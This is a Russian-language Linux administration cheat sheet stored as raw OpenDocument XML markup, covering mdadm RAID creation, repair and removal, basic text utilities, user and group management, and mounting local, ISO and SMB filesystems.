      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">cat</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">proc</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">mdstat</text:span><text:span text:style-name="T3"> - состояние всех </text:span><text:span text:style-name="T2">RAID</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mdadm</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">D</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">dev</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">md</text:span><text:span text:style-name="T3">0 - подробная инфа о конкретном </text:span><text:span text:style-name="T2">RAID</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">lsblk</text:span><text:span text:style-name="T3"> - список дисков с разделами, местом, типом</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">df</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">hT</text:span><text:span text:style-name="T3"> - свободное место, тип файловой системы, точки монтирования</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Сборка </text:span><text:span text:style-name="T2">RAID</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mdadm</text:span><text:span text:style-name="T3"> --</text:span><text:span text:style-name="T2">zero</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">superblock</text:span><text:span text:style-name="T3"> --</text:span><text:span text:style-name="T2">force</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">dev</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">sd</text:span><text:span text:style-name="T3">{</text:span><text:span text:style-name="T2">b</text:span><text:span text:style-name="T3">,</text:span><text:span text:style-name="T2">c</text:span><text:span text:style-name="T3">} - обнуление суперблоков на дисках </text:span><text:span text:style-name="T2">sdb</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">sdc</text:span><text:span text:style-name="T3"> (для удаления инфы о других </text:span><text:span text:style-name="T2">RAID</text:span><text:span text:style-name="T3">) при получении ответа </text:span><text:span text:style-name="T2">mdadm</text:span><text:span text:style-name="T3">: </text:span><text:span text:style-name="T2">Unrecognised</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">md</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">component</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">device</text:span><text:span text:style-name="T3"> - /</text:span><text:span text:style-name="T2">dev</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">sdb</text:span><text:span text:style-name="T3"> значит, что диск не использовался для </text:span><text:span text:style-name="T2">RAID</text:span><text:span text:style-name="T3">, продолжаем</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2">mdadm --create --verbose /dev/md0 -l 1 -n 2 /dev/sd{b,c}</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T3">* где /</text:span><text:span text:style-name="T2">dev</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">md</text:span><text:span text:style-name="T3">0 - устройство </text:span><text:span text:style-name="T2">RAID</text:span><text:span text:style-name="T3">, которое появится после сборки; -</text:span><text:span text:style-name="T2">l</text:span><text:span text:style-name="T3"> 1 - уровень </text:span><text:span text:style-name="T2">RAID</text:span><text:span text:style-name="T3">; -</text:span><text:span text:style-name="T2">n</text:span><text:span text:style-name="T3"> 2 - количество дисков, из которых собирается массив; /</text:span><text:span text:style-name="T2">dev</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">sd</text:span><text:span text:style-name="T3">{</text:span><text:span text:style-name="T2">b</text:span><text:span text:style-name="T3">,</text:span><text:span text:style-name="T2">c</text:span><text:span text:style-name="T3">} - сборка выполняется из дисков </text:span><text:span text:style-name="T2">sdb</text:span><text:span text:style-name="T3"> и </text:span><text:span text:style-name="T2">sdc</text:span><text:span text:style-name="T3">.</text:span></text:p>
      <text:p text:style-name="P1">Создание файловой системы и монтирование массива</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mkfs</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">ext</text:span><text:span text:style-name="T3">4 /</text:span><text:span text:style-name="T2">dev</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">md</text:span><text:span text:style-name="T3">0 - создание файловой системы </text:span><text:span text:style-name="T2">ext</text:span><text:span text:style-name="T3">4 на </text:span><text:span text:style-name="T2">md</text:span><text:span text:style-name="T3">0</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mount</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">dev</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">md</text:span><text:span text:style-name="T3">0 /</text:span><text:span text:style-name="T2">mnt</text:span><text:span text:style-name="T3"> - разово примонтировать </text:span><text:span text:style-name="T2">md</text:span><text:span text:style-name="T3">0 к /</text:span><text:span text:style-name="T2">mnt</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">nano</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">etc</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">fstab</text:span><text:span text:style-name="T3">, прописать /</text:span><text:span text:style-name="T2">dev</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">md</text:span><text:span text:style-name="T3">0 /</text:span><text:span text:style-name="T2">mnt</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">ext</text:span><text:span text:style-name="T3">4 </text:span><text:span text:style-name="T2">defaults</text:span><text:span text:style-name="T3"> 1 2 - постоянное монтирование, работает после перезагрузки</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Восстановление </text:span><text:span text:style-name="T2">RAID</text:span></text:p>
      <text:p text:style-name="P1">Замена жесткого диска</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">При выходе из строя, команда </text:span><text:span text:style-name="T2">mdadm</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">D</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">dev</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">md</text:span><text:span text:style-name="T3">0 выдаст: </text:span><text:span text:style-name="T2">State</text:span><text:span text:style-name="T3"> : </text:span><text:span text:style-name="T2">clean</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">degraded</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remove</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">dev</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">sdc</text:span><text:span text:style-name="T3"> - удалить сбойный диск</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e</text:span><text:span text:style-name="T3"> - добавить новый диск в массив</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Статус должен стать </text:span><text:span text:style-name="T2">Rebuild</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Status</text:span><text:span text:style-name="T3"> : 40% </text:span><text:span text:style-name="T2">complete</text:span><text:span text:style-name="T3"> и так до полного восстановления</text:span></text:p>
      <text:p text:style-name="P1">Пересборка массива</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Если нам нужно вернуть ранее разобранный или развалившийся массив из дисков, которые уже входили в состав </text:span><text:span text:style-name="T2">RAID</text:span><text:span text:style-name="T3">, вводим:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mdadm</text:span><text:span text:style-name="T3"> --</text:span><text:span text:style-name="T2">assemble</text:span><text:span text:style-name="T3"> --</text:span><text:span text:style-name="T2">scan</text:span><text:span text:style-name="T3"> - команда сама найдет необходимую конфигурацию и восстановит </text:span><text:span text:style-name="T2">RAID</text:span><text:span text:style-name="T3">.</text:span></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">mdadm</text:span><text:span text:style-name="T3"> --</text:span><text:span text:style-name="T2">assemble</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">dev</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">md</text:span><text:span text:style-name="T3">0 /</text:span><text:span text:style-name="T2">dev</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">sdb</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">dev</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">sdc</text:span><text:span text:style-name="T3"> - с указанием из каких дисков пересобрать</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Запасной диск (</text:span><text:span text:style-name="T2">Hot</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Spare</text:span><text:span text:style-name="T3">)</text:span></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d</text:span><text:span text:style-name="T3"> - Диском </text:span><text:span text:style-name="T2">Hot</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Spare</text:span><text:span text:style-name="T3"> станет тот, который просто будет добавлен к массиву</text:span></text:p>
      <text:p text:style-name="P1">Добавить диск к массиву, расширить массив</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">Добавление активного диска к </text:span><text:span text:style-name="T2">RAID</text:span><text:span text:style-name="T3">, который будет использоваться для работы, а не в качестве запасного.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mdadm /dev/md0 --add /dev/sde</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mdadm -G /dev/md0 --raid-devices=3 - расширяем RAID</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">* в данном примере подразумевается, что у нас </text:span><text:span text:style-name="T2">RAID</text:span><text:span text:style-name="T3"> 1 и мы добавили к нему 3-й диск.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Установка </text:span><text:span text:style-name="T2">mdadm</text:span></text:p>
      <text:p text:style-name="P1">Если каким-то образом в дистрибутиве нет этого пакета</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">apt-get install mdadm</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Удаление массива</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Если нам нужно полностью разобрать </text:span><text:span text:style-name="T2">RAID</text:span><text:span text:style-name="T3">, сначала размонтируем и остановим его:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">umount</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">mnt</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">* где /</text:span><text:span text:style-name="T2">mnt</text:span><text:span text:style-name="T3"> - каталог монтирования нашего </text:span><text:span text:style-name="T2">RAID</text:span><text:span text:style-name="T3">.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mdadm</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">S</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">dev</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">md</text:span><text:span text:style-name="T3">0</text:span></text:p>
      <text:p text:style-name="P13">Затем очищаем суперблоки на всех дисках, из которых он был собран:</text:p>
      <text:p text:style-name="P15">mdadm --zero-superblock /dev/sdb</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mdadm --zero-superblock /dev/sdc</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">mdadm --zero-superblock /dev/sdd</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Linux-</text:span><text:span text:style-name="T3">команды</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">для</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">работы</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">с</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">текстом</text:span></text:p>
      <text:p text:style-name="P1">Используя командную строку, на компьютере можно выполнять различные задачи, не пользуясь мышью или сенсорным вводом. С помощью команд удобно не только передвигаться по каталогам, но и работать с текстом любых размеров.</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">less</text:span><text:span text:style-name="T3"> - команда для просмотра длинных текстов, которые не вмещаются на одном экране. Используется, если ваш терминал не поддерживает прокрутку текста.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">head</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">tail</text:span><text:span text:style-name="T3"> - команды, которые показывают начало или конец файла соответственно. С флагом -</text:span><text:span text:style-name="T2">n</text:span><text:span text:style-name="T3"> покажут заданное количество строк, вместо 10 выводящихся по умолчанию. Команда вида </text:span><text:span text:style-name="T2">tail</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">n</text:span><text:span text:style-name="T3"> 3 </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">txt</text:span><text:span text:style-name="T3"> выведет на экран три последние строчки файла </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">txt</text:span><text:span text:style-name="T3">.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">grep</text:span><text:span text:style-name="T3"> - выполняет в файле поиск по шаблону. Обязательно требует после себя наличие шаблона. Команда </text:span><text:span text:style-name="T2">grep</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">hello</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">txt</text:span><text:span text:style-name="T3"> найдет в файле </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">txt</text:span><text:span text:style-name="T3"> все строки, в которых присутствует шаблон «</text:span><text:span text:style-name="T2">hello</text:span><text:span text:style-name="T3">», и выведет их на экран. Может использоваться совместно с другими командами.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">sort</text:span><text:span text:style-name="T3"> - сортирует строки текста по различным критериям. По умолчанию утилита сортирует строки по алфавиту. С флагом -</text:span><text:span text:style-name="T2">r</text:span><text:span text:style-name="T3"> команда вида </text:span><text:span text:style-name="T2">sort</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">r</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">txt</text:span><text:span text:style-name="T3"> выполнит сортировку в обратном порядке: от </text:span><text:span text:style-name="T2">Z</text:span><text:span text:style-name="T3"> к </text:span><text:span text:style-name="T2">A</text:span><text:span text:style-name="T3">.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">wc</text:span><text:span text:style-name="T3"> - утилита для подсчета количества слов, строк, байт и слов в файле. Без флагов команда выводит количества слов, строк и байт. С флагом -</text:span><text:span text:style-name="T2">w</text:span><text:span text:style-name="T3"> показывает количество слов в объекте (строке или файле).</text:span></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">diff</text:span><text:span text:style-name="T3"> - показывает различия между двумя файлами в построчном сравнении. Причём выводятся только строки, в которых обнаружены отличия. Измененные строки отмечаются символом «с», удаленные - «</text:span><text:span text:style-name="T2">d</text:span><text:span text:style-name="T3">», а новые - «а».</text:span></text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">Пользователи и группы</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">useradd</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">c</text:span><text:span text:style-name="T3"> "</text:span><text:span text:style-name="T2">User</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Vasya</text:span><text:span text:style-name="T3">" -</text:span><text:span text:style-name="T2">g</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">admin</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">d</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">home</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">vasya</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">s</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">bin</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">bash</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">vasya</text:span><text:span text:style-name="T3"> - Создать пользователя </text:span><text:span text:style-name="T2">vasya</text:span><text:span text:style-name="T3">, домашним каталогом будет создана директория /</text:span><text:span text:style-name="T2">home</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">vasya</text:span><text:span text:style-name="T3">, в качестве системной оболочки будет назначен /</text:span><text:span text:style-name="T2">bin</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">bash</text:span><text:span text:style-name="T3">, пользователь будет включен в группу </text:span><text:span text:style-name="T2">admin</text:span><text:span text:style-name="T3">, кроме того, для учетной записи будет создан комментарий "</text:span><text:span text:style-name="T2">User</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Vasya</text:span><text:span text:style-name="T3">"</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">useradd</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">vasya</text:span><text:span text:style-name="T3"> - Создать пользователя </text:span><text:span text:style-name="T2">vasya</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">usermod</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">c</text:span><text:span text:style-name="T3"> "</text:span><text:span text:style-name="T2">User</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">FTP</text:span><text:span text:style-name="T3">" -</text:span><text:span text:style-name="T2">g</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">system</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">d</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">ftp</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">ftpuser</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">s</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">bin</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">nologin</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">ftpuser</text:span><text:span text:style-name="T3"> - Изменение пользователя</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">userdel</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">r</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">vasya</text:span><text:span text:style-name="T3"> - Удалить пользователя с именем </text:span><text:span text:style-name="T2">vasya</text:span><text:span text:style-name="T3"> и его домашнюю директорию</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">groupadd</text:span><text:span text:style-name="T3"> [ </text:span><text:span text:style-name="T2">group</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T2">name</text:span><text:span text:style-name="T3"> ] - Создать группу с именем </text:span><text:span text:style-name="T2">group</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T2">name</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">chage</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">E</text:span><text:span text:style-name="T3"> 2005-12-31 </text:span><text:span text:style-name="T2">vasya</text:span><text:span text:style-name="T3"> - Установить дату окончания действия учётной записи пользователя </text:span><text:span text:style-name="T2">vasya</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># groupdel [ group_name ] - Удалить группу group_name</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># groupmod -n test new_test - Переименовать группу test в new_test</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">newgrp</text:span><text:span text:style-name="T3"> - [</text:span><text:span text:style-name="T2">group</text:span><text:span text:style-name="T3">] - Изменяет основную группу текущего пользователя. При указании "-", ситуация будет идентичной той, в которой пользователь вышил из системы и снова вошёл.</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3">Если не указывать группу, основная группа будет назначена из файла /</text:span><text:span text:style-name="T2">etc</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">passwd</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">grpck</text:span><text:span text:style-name="T3"> - Проверка корректности системных файлов учётных записей. Проверяется файл/</text:span><text:span text:style-name="T2">etc</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">group</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">pwck</text:span><text:span text:style-name="T3"> - Проверка корректности системных файлов учётных записей. Проверяются файлы /</text:span><text:span text:style-name="T2">etc</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">passwd</text:span><text:span text:style-name="T3"> и /</text:span><text:span text:style-name="T2">etc</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">shadow</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">passwd</text:span><text:span text:style-name="T3"> - Изменить пароль текущего пользователя</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">passwd</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">vasya</text:span><text:span text:style-name="T3"> - Изменить пароль пользователя </text:span><text:span text:style-name="T2">vasya</text:span><text:span text:style-name="T3"> (может выполнять только </text:span><text:span text:style-name="T2">root</text:span><text:span text:style-name="T3">)</text:span></text:p>
      <text:p text:style-name="P1">Монтирование файловых систем</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">mount</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">dev</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">hda</text:span><text:span text:style-name="T3">1 /</text:span><text:span text:style-name="T2">mnt</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">disk</text:span><text:span text:style-name="T3"> - Монтировать устройство /</text:span><text:span text:style-name="T2">dev</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">hda</text:span><text:span text:style-name="T3">1 в папку с именем /</text:span><text:span text:style-name="T2">mnt</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">disk</text:span><text:span text:style-name="T3">. точка монтирования, папка /</text:span><text:span text:style-name="T2">mnt</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">disk</text:span><text:span text:style-name="T3">, должна существовать</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">fuser</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">km</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">mnt</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">hda</text:span><text:span text:style-name="T3">1 - Размонтировать устройство </text:span><text:span text:style-name="T2">hda</text:span><text:span text:style-name="T3">1 если оно заблокировано каким либо процессом</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">mount</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">o</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">loop</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">iso</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">mnt</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">cdrom</text:span><text:span text:style-name="T3"> - Смонтировать фаил или образ </text:span><text:span text:style-name="T2">ISO</text:span><text:span text:style-name="T3"> в директорию /</text:span><text:span text:style-name="T2">mnt</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">cdrom</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># mount /dev/hdb /mnt/cdrecorder - Монтировать cdrw или dvdrom</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">mount</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">t</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">vfat</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">dev</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">hda</text:span><text:span text:style-name="T3">5 /</text:span><text:span text:style-name="T2">mnt</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">hda</text:span><text:span text:style-name="T3">5 - Смонтировать раздел с файловой системой </text:span><text:span text:style-name="T2">FAT</text:span><text:span text:style-name="T3">32</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">mount</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">dev</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">cdrom</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">mnt</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">cdrom</text:span><text:span text:style-name="T3"> - Монтировать </text:span><text:span text:style-name="T2">cdrom</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fd</text:span><text:span text:style-name="T3">0 /</text:span><text:span text:style-name="T2">mnt</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">floppy</text:span><text:span text:style-name="T3"> - Монтировать </text:span><text:span text:style-name="T2">floppy</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">disk</text:span><text:span text:style-name="T3"> ( дисковод мягких дисков )</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">mount</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">dev</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">hdc</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">mnt</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">cdrecorder</text:span><text:span text:style-name="T3"> - Монтировать </text:span><text:span text:style-name="T2">cdrw</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sda</text:span><text:span text:style-name="T3">1 /</text:span><text:span text:style-name="T2">mnt</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">usbdisk</text:span><text:span text:style-name="T3"> - Монтировать </text:span><text:span text:style-name="T2">USB</text:span><text:span text:style-name="T3"> устройство</text:span></text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">mount</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">t</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">smbfs</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">o</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">username</text:span><text:span text:style-name="T3">=</text:span><text:span text:style-name="T2">user</text:span><text:span text:style-name="T3">,</text:span><text:span text:style-name="T2">password</text:span><text:span text:style-name="T3">=</text:span><text:span text:style-name="T2">pass</text:span><text:span text:style-name="T3"> //</text:span><text:span text:style-name="T2">WinClient</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">share</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">mnt</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">share</text:span><text:span text:style-name="T3"> - Монтировать сетевую файловую систему </text:span><text:span text:style-name="T2">Windows</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">SMB</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">CIFS</text:span><text:span text:style-name="T3">)</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">umount</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">n</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">mnt</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">hda</text:span><text:span text:style-name="T3">2 - Размонтировать без записи в файл /</text:span><text:span text:style-name="T2">etc</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">mtab</text:span><text:span text:style-name="T3">, используется в ситуациях, когда файл находится в режиме только чтение или жесткий диск переполнен</text:span></text:p>
